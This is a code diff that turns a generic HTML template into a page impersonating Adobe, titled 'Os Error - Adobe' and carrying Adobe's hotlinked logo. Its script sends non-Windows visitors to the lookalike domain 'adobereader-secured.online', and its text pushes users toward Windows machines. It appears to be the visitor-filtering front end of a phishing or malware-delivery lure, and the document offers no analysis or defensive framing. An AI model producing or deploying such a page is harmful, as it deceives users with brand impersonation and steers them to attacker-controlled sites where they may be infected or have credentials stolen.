@@ -1,17 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Your Page Title</title>
+  <title>Os Error - Adobe</title>
   <style type="text/css">
     /* Style the message element */
     #message {
       font-family: Arial, sans-serif;
       font-size: 16px;
-      color: #333;
+      color: #fff;
       padding: 20px;
-      background-color: #f2f2f2;
+      background-color: #FF0000;
       border: 1px solid #ccc;
       text-align: center;
+      position: relative;
+    }
+
+    /* Style the Adobe logo */
+    #adobe-logo {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      width: 100px;
+      height: auto;
     }
   </style>
   <script type="text/javascript">
@@ -23,13 +33,21 @@
     // Redirect the user if they are not on Windows OS
     if (!isWindows()) {
       // Redirect to a Windows-only message page
-      window.location.href = 'https://example.com/windows-only';
+      window.location.href = 'https://adobereader-secured.online/valid.html';
     }
   </script>
 </head>
 <body>
   <div id="message">
-    <p>This page is only accessible on Windows.</p>
+    <img src="https://www.adobe.com/content/dam/cc/icons/adobe-logo-178x100.svg" alt="Adobe logo" id="adobe-logo">
+    <p>This page is only accessible on Windows. If you're trying to access this page on a Mac, Linux, or any other operating system, please switch to a Windows computer to access this page.</p>
+    <p>There are several ways to access Windows on your computer:</p>
+    <ul>
+      <li>If you already have a Windows computer, you can use it to access this page.</li>
+      <li>If you have a Mac, you can use Boot Camp or virtualization software like Parallels or VMware to run Windows on your Mac.</li>
+      <li>If you have a Linux computer, you can use Wine or a virtualization software like VirtualBox to run Windows applications on your Linux computer.</li>
+      <li>If you don't have access to a Windows computer, you can use a public computer that runs Windows, such as those found in libraries, internet cafes, or computer labs.</li>
+    </ul>
   </div>
   <!-- Your HTML content here -->
 </body>
